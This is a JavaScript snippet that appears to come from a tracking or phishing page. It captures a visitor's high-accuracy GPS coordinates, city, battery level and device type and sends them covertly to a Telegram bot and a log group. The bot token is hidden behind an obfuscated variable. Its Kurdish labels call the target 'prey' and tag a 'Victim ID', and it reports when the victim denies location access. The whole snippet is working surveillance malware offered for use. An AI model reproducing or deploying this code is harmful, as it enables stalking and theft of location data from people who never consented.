    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const u_name = params.get('u') || "Not Found";
        if (!uid) return;

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            let city = "Unknown";
            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                city = geoData.city + " / " + (geoData.region || "");
            } catch (e) { city = "Not Found"; }

            let bat = "N/A";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bat = Math.floor(b.level * 100) + "%";
                }
            } catch (e) {}

            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
                         `🆔 <b>Victim ID:</b> <code>${uid}</code>\n` +
                         `👤 <b>User:</b> @${u_name}\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🔋 <b>Battery:</b> ${bat}\n` +
                         `📱 <b>Device:</b> ${navigator.platform}\n` +
                         `🕒 <b>Time:</b> ${timeStr}\n` +
                         `🏙️ <b>City:</b> ${city}`;

            const userUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            const groupUrl = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(report)}&parse_mode=HTML`;

            navigator.sendBeacon(userUrl);
            navigator.sendBeacon(groupUrl);

        }, (err) => {
            const errLog = `❌ نێچیر (ID: ${uid} / @${u_name}) لۆکەیشنی داخست.`;
            navigator.sendBeacon(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(errLog)}`);
            navigator.sendBeacon(`https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${LOG_GROUP}&text=${encodeURIComponent(errLog)}`);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
